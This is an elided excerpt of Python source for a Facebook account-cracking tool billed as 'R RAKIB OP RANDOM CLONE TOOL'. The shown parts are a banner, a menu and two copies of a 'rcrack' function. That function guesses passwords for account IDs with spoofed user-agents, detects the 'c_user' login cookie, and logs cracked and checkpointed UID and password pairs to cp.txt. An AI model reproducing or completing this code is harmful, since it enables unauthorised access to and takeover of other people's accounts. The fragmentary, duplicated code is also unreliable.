...
|/   \__/|/     \||_/    \/\_______/|/ \___/
\033[1;37m------------------------------------
\033[1;37m Owner   : MR-RAKIB OP
\033[1;37m Facebook: RAKIB
\033[1;37m Github  : PRIVATE 
\033[1;37m Version : 5.0
\033[1;37m------------------------------------
\33[1;97m\33[42m[\33[1;31mTOOLS\x1b[38;5;208m: \33[1;31mR RAKIB OP  RANDOM CLONE TOOL \33[1;97m-1.0\33[1;97m]\x1b[0m
\33[1;92m---------------------------------------""") 
...
def menu():
	...
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("xdg-open https://www.facebook.com/ab.rakib.54966?mibextid=kFxxJD")
		menu()
    #if opt =='0':
    	#exit()
    #else:
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[MR RAKIB OP-OK] '+uid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\n\033[1;91m[MR RAKIB OP-CP] '+uid+' | '+ps+'\033[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write(f'\r\033[m[MR RAKIB] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
		sys.stdout.flush()
	except:
		pass
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[MR RAKIB OP-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
